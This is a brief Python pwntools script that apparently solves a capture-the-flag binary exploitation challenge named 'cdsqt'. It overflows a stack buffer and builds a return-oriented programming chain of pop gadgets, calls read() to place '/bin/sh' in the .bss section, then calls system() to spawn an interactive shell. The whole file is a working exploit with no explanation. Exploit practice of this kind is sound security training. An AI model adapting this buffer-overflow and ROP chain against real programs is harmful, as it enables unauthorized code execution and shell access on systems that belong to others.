from pwn import *
p = process("./cdsqt")
elf = ELF('./cdsqt')

system = elf.plt['system']
read = elf.plt['read']
pop_rdi = 0x401196
pop_rsi = 0x4011ad
pop_rdx = 0x401265
bss = 0x4040A0

p.recv()

payload = b'a'*(0xa+8)
payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi)+p64(bss)
payload+=p64(pop_rdx)+p64(0x10)
payload+=p64(read)#read(0,buf,0x10)
payload+=p64(pop_rdi)+p64(bss)+p64(system)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')

p.interactive()
